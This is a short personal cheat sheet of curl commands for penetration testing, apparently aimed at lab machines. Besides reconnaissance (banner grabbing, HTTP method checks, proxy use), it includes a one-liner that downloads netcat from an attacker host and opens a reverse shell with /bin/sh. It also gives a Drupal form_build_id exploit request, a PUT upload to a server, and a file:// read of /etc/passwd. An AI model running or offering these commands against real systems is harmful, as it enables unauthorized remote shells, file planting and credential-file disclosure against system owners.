__tags: curl web

## Send Data values

```
curl -k -i "http://10.10.10.9/?q=file/ajax/name/%23value/${form_build_id}" --data "form_build_id=${form_build_id}"
```

## Set Timeout

```
curl --connect-timeout 3 10.10.14.31:443/a.txt > /tmp/cat.txt
```

## Download nc using curl and execute it

```
curl --connect-timeout 3 10.10.14.31:443/nc > /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.31 3333 -e /bin/sh
```

## Banner Grabbing with curl (Alsd get web headers from this!!!!)

```
# For websites or web servers:

curl -s -I 10.10.10.11:8500

# For Other things on Ports:

curl 10.10.10.11:22

```

## Check to see if bad http methods are implemented

```
curl -sIX TRACE $TARGET

# OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
```

## Set user agent

```
curl --user-agent "user agent" url
```

## Use proxy and to get options

```
curl --proxy 127.0.0.1:8080 -sI -X OPTIONS http://10.10.10.56

```

## Put files on servers if it allows you to:

```
curl -X PUT http://192.168.30.97:8080/hello.txt -d @- < hello.txt

```

## Check SOCKS 5 Proxy

```
curl --socks5-hostname localhost:2222 ifconfig.me
```

## Grab a local file with curl
```
curl http:// file:///etc/passwd
```